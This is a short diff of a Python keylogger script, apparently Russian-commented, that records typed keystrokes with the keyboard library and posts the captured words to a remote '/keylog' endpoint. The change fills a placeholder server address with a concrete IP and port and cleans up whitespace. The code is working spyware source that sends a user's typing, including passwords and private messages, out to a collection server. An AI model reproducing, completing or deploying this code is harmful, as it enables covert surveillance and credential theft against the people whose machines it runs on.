@@ -3,7 +3,7 @@ import requests
 import ctypes
 import time
 
-SERVER_URL = 'http://server_ip:5000/keylog'
+SERVER_URL = 'http://192.168.127.1:5000/keylog'
 
 
 def get_char():
@@ -42,11 +42,11 @@ while True:
             except Exception as e:
                 print(f"Ошибка при отправке: {e}")
             break
-        elif len(key) == 1 or key in ['space', 'enter', 'tab']:  
+        elif len(key) == 1 or key in ['space', 'enter', 'tab']:
             try:
-                
+
                 char = keyboard.get_typed_strings([event])
-                char = next(char, '') 
+                char = next(char, '')
                 word += char
 
             except:
